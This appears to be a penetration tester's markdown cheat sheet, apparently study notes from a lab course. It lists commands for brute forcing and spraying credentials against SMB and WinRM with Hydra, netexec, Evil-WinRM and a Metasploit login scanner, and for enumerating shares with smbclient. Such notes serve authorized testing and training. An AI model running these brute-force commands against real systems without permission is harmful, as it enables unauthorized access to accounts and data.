### Content
- [Tools Usage](#tools-usage)
	- [Evil-WinRM Usage](#evil-winrm-usage)
	- [CrackMapExec/netexec Usage](#crackmapexec/netexec-usage)
	- [Hydra](#hydra)
- [Protocols](#protocols)
	- [SMB](#smb)
---
# Tools Usage
> [!Important]
> Use `netexec` instead of `crackmapexec` with the same syntax.

##### Evil-WinRM Usage
- To communicate with the WinRM service
``` bash
evil-winrm -i <target-IP> -u <username> -p <password>
```
##### CrackMapExec/netexec Usage
``` bash
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
##### Hydra
- To brute force various protocols.
``` bash
hydra -L user.list -P password.list <protocol>://<IP>
```

> See Hydra.md in the Tools directory
---
# Protocols
### SMB
- Brute force SMB with hydra:
	``` bash
	$ hydra -L user.list -P password.list smb://10.129.42.197
	```
	- If we got an error `[ERROR] invalid reply from target smb://10.129.42.197:445/`
	- This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies.
	- use `msfconsole`
		``` bash
		$ msfconsole -q
		msf6 > use auxiliary/scanner/smb/smb_login
		msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
		msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
		msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
		msf6 auxiliary(scanner/smb/smb_login) > run
		```
- View the available shares and what privileges we have for them
	``` bash
	netexec smb 10.129.42.197 -u "user" -p "password" --shares
	```
- To communicate with the server via SMB
	``` bash
	# List all shares available
	$ smbclient -L 172.16.5.5 -U user%password
	
	$ smbclient -U user \\\\10.129.42.197\\SHARENAME
	```